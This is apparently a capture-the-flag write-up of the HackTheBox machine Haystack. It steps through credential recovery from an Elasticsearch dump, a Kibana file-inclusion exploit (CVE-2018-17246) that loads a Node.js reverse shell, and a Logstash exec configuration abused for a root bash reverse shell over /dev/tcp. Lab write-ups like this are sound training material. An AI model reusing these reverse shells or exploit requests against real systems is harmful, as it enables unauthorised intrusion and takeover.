# Haystack - HackTheBox
## Linux - Easy

### Nmap
Nmap shows that ports 22/SSH, 80/HTTP, and 9200/HTTP are open.

### Port 80
Going on port 80 first, we see an image `needle.jpg` of a needle. Going through the usual steganography methods, we find that there is a base64 string appended to the image:
```bash
$ tail -1 needle.jpg | base64 -d
la aguja en el pajar es "clave"
```
which translate to `the needle in the haystack is "key"/"clave"`. Not so helpful...

### Port 9200
going on port 9200, we get an ElasticSearch endpoint. Looking around, we do not get many interesting things. I installed the tool `elasticdump` that dumps the ElasticSearch database:
```bash
$ elasticdump --input=http://10.10.10.115:9200 --output=dump
```
The database is quite large and mostly in spanish, so it's hard to find interesting stuff. But then, I remembered that the needle is "clave":
```bash
$ grep clave dump
{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}
{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}
```
We see two base64 strings, which decode to:
```
pass: spanish.is.key
user: security
```
Trying these creds on ssh, it works!

### First PrivEsc
We are in the box as user `security`. Looking around, we see that `kibana` is installed and listening on port 5601. Googling for exploits, we find [this on](https://github.com/mpgn/CVE-2018-17246), which works perfectly:
```bash
$ cat /tmp/rev.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(9067, "10.10.15.250", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
$ curl '127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/rev.js'
```
gives a shell as user `kibana`.

### Second PrivEsc
Looking around, we see three unusual config files for `logstash`:
```bash
$ cat /etc/logstash/conf.d/filter.conf
filter {
    if [type] == "execute" {
        grok {
            match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
        }
    }
}

$ cat /etc/logstash/conf.d/input.conf 
input {
    file {
        path => "/opt/kibana/logstash_*"
        start_position => "beginning"
        sincedb_path => "/dev/null"
        stat_interval => "10 second"
        type => "execute"
        mode => "read"
    }
}

$ cat /etc/logstash/conf.d/output.conf 
output {
    if [type] == "execute" {
        stdout { codec => json }
        exec {
            command => "%{comando} &"
        }
    }
}
```
Looking at the `logstash` documentation, we see that these config files do the following: `logstash` looks every 10 seconds in the folder `/opt/kbana/` for files `logstash_*`, matches their content for the regex `Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}` and executes the command `comando`.

We thus have code execution as root:
```bash
$ cat /opt/kibana/logstash_fin 
Ejecutar comando : bash -c "bash -i >& /dev/tcp/10.10.15.250/9002 0>&1"
```
and listening on port 9002, we get a root shell!
